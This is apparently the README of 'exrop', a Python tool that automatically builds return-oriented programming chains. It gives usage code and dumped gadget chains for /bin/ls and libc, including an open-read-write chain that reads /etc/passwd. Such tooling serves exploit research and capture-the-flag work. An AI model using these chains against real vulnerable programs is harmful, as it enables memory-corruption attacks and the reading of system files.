# exrop
Automatic ROP Chain Generation

Requirements : [Triton](https://github.com/JonathanSalwan/Triton), [ROPGadget](https://github.com/JonathanSalwan/ROPgadget)

Features:
- set registers (`rdi=0xxxxxx, rsi=0xxxxxx`)
- set register to register (`rdi=rax`)
- write to mem
- write string/bytes to mem
- function call (`open('/etc/passwd',0)`)
- pass register in function call (`read('rax', bss, 0x100)`)
- avoiding badchars is experimental (need more tests, see [tests/](./tests))
``` python
from Exrop import Exrop

rop = Exrop("/bin/ls")
rop.find_gadgets(cache=True)
print("write-regs gadgets: rdi=0x41414141, rsi:0x42424242, rdx: 0x43434343, rax:0x44444444, rbx=0x45454545")
chain = rop.set_regs({'rdi':0x41414141, 'rsi': 0x42424242, 'rdx':0x43434343, 'rax':0x44444444, 'rbx': 0x45454545})
chain.dump()
print("write-what-where gadgets: [0x41414141]=0xdeadbeefff, [0x43434343]=0x110011")
chain = rop.set_writes({0x41414141: 0xdeadbeefff, 0x43434343: 0x00110011})
chain.dump()
print("write-string gadgets 0x41414141=\"Hello world!\\n\"")
chain = rop.set_string({0x41414141: "Hello world!\n"})
chain.dump()
print("func-call gadgets 0x41414141(0x20, 0x30, \"Hello\")")
chain = rop.func_call(0x41414141, (0x20, 0x30, "Hello"), 0x7fffff00)
chain.dump()
```
Output:
```
write-regs gadget: rdi=0x41414141, rsi:0x42424242, rdx: 0x43434343, rax:0x44444444, rbx=0x45454545
$RSP+0x0000 : 0x00000000000060d0 # pop rbx; ret
$RSP+0x0008 : 0x0000000044444444
$RSP+0x0010 : 0x0000000000014852 # mov rax, rbx; pop rbx; ret
$RSP+0x0018 : 0x0000000000000000
$RSP+0x0020 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0028 : 0x0000000041414141
$RSP+0x0030 : 0x000000000000629c # pop rsi; ret
$RSP+0x0038 : 0x0000000042424242
$RSP+0x0040 : 0x0000000000003a62 # pop rdx; ret
$RSP+0x0048 : 0x0000000043434343
$RSP+0x0050 : 0x00000000000060d0 # pop rbx; ret
$RSP+0x0058 : 0x0000000045454545

write-what-where gadgets: [0x41414141]=0xdeadbeefff, [0x43434343]=0x110011
$RSP+0x0000 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0008 : 0x000000deadbeefff
$RSP+0x0010 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0018 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0020 : 0x0000000041414139
$RSP+0x0028 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret
$RSP+0x0030 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0038 : 0x0000000000110011
$RSP+0x0040 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0048 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0050 : 0x000000004343433b
$RSP+0x0058 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret

write-string gadgets 0x41414141="Hello world!\n"
$RSP+0x0000 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0008 : 0x6f77206f6c6c6548
$RSP+0x0010 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0018 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0020 : 0x0000000041414139
$RSP+0x0028 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret
$RSP+0x0030 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0038 : 0x0000000a21646c72
$RSP+0x0040 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0048 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0050 : 0x0000000041414141
$RSP+0x0058 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret

func-call gadgets 0x41414141(0x20, 0x30, "Hello")
$RSP+0x0000 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0008 : 0x0000006f6c6c6548
$RSP+0x0010 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0018 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0020 : 0x000000007ffffef8
$RSP+0x0028 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret
$RSP+0x0030 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0038 : 0x0000000000000020
$RSP+0x0040 : 0x000000000000629c # pop rsi; ret
$RSP+0x0048 : 0x0000000000000030
$RSP+0x0050 : 0x0000000000003a62 # pop rdx; ret
$RSP+0x0058 : 0x000000007fffff00
$RSP+0x0060 : 0x0000000041414141

python3 tests.py  1,48s user 0,05s system 97% cpu 1,566 total

```
Another example: open-read-write gadgets!

``` python
from pwn import *
from Exrop import Exrop

binname = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(binname, checksec=False)
open = libc.symbols['open']
read = libc.symbols['read']
write = libc.symbols['write']
bss = libc.bss()


rop = Exrop(binname)
rop.find_gadgets(cache=True)
print("open('/etc/passwd', 0)")
chain = rop.func_call(open, ("/etc/passwd", 0), bss)
chain.dump()
print("read('rax', bss, 0x100)") # register can be used as argument too!
chain = rop.func_call(read, ('rax', bss, 0x100))
chain.dump()
print("write(1, bss, 0x100)")
chain = rop.func_call(write, (1, bss, 0x100))
chain.dump()
```

Output:
```
open('/etc/passwd', 0)
$RSP+0x0000 : 0x000000000002155f # pop rdi; ret
$RSP+0x0008 : 0x7361702f6374652f
$RSP+0x0010 : 0x0000000000021558 # pop r12; pop r13; pop r14; pop r15; ret
$RSP+0x0018 : 0x0000000000000000
$RSP+0x0020 : 0x00000000003ec860
$RSP+0x0028 : 0x0000000000000000
$RSP+0x0030 : 0x0000000000000000
$RSP+0x0038 : 0x0000000000103cc9 # pop rdx; pop rcx; pop rbx; ret
$RSP+0x0040 : 0x0000000000000000
$RSP+0x0048 : 0x0000000000000000
$RSP+0x0050 : 0x0000000000155fc7
$RSP+0x0058 : 0x0000000000022b8a # mov r9, r13; call rbx: next -> (0x00155fc7) # pop rax; mov eax, 1; ret
$RSP+0x0060 : 0x00000000001411c7 # mov qword ptr [r9], rdi; ret
$RSP+0x0068 : 0x000000000002155f # pop rdi; ret
$RSP+0x0070 : 0x0000000000647773
$RSP+0x0078 : 0x0000000000021558 # pop r12; pop r13; pop r14; pop r15; ret
$RSP+0x0080 : 0x0000000000000000
$RSP+0x0088 : 0x00000000003ec868
$RSP+0x0090 : 0x0000000000000000
$RSP+0x0098 : 0x0000000000000000
$RSP+0x00a0 : 0x0000000000103cc9 # pop rdx; pop rcx; pop rbx; ret
$RSP+0x00a8 : 0x0000000000000000
$RSP+0x00b0 : 0x0000000000000000
$RSP+0x00b8 : 0x0000000000155fc7
$RSP+0x00c0 : 0x0000000000022b8a # mov r9, r13; call rbx: next -> (0x00155fc7) # pop rax; mov eax, 1; ret
$RSP+0x00c8 : 0x00000000001411c7 # mov qword ptr [r9], rdi; ret
$RSP+0x00d0 : 0x000000000002155f # pop rdi; ret
$RSP+0x00d8 : 0x00000000003ec860
$RSP+0x00e0 : 0x0000000000023e6a # pop rsi; ret
$RSP+0x00e8 : 0x0000000000000000
$RSP+0x00f0 : 0x000000000010fc40

read('rax', bss, 0x100)
$RSP+0x0000 : 0x0000000000021558 # pop r12; pop r13; pop r14; pop r15; ret
$RSP+0x0008 : 0x0000000000155fc7
$RSP+0x0010 : 0x0000000000000000
$RSP+0x0018 : 0x0000000000000000
$RSP+0x0020 : 0x0000000000000000
$RSP+0x0028 : 0x0000000000106899 # mov r8, rax; call r12: next -> (0x00155fc7) # pop rax; mov eax, 1; ret
$RSP+0x0030 : 0x000000000011c659 # mov rax, rbx; pop rdx; pop rbx; ret
$RSP+0x0038 : 0x0000000000000000
$RSP+0x0040 : 0x0000000000155fc7
$RSP+0x0048 : 0x000000000011c659 # mov rax, rbx; pop rdx; pop rbx; ret
$RSP+0x0050 : 0x0000000000000000
$RSP+0x0058 : 0x0000000000000000
$RSP+0x0060 : 0x000000000009ba08 # mov rdi, r8; call rax: next -> (0x00155fc7) # pop rax; mov eax, 1; ret
$RSP+0x0068 : 0x00000000001306d9 # pop rdx; pop rsi; ret
$RSP+0x0070 : 0x0000000000000100
$RSP+0x0078 : 0x00000000003ec860
$RSP+0x0080 : 0x0000000000110070

write(1, bss, 0x100)
$RSP+0x0000 : 0x00000000001306d9 # pop rdx; pop rsi; ret
$RSP+0x0008 : 0x0000000000000100
$RSP+0x0010 : 0x00000000003ec860
$RSP+0x0018 : 0x000000000002155f # pop rdi; ret
$RSP+0x0020 : 0x0000000000000001
$RSP+0x0028 : 0x0000000000110140
```
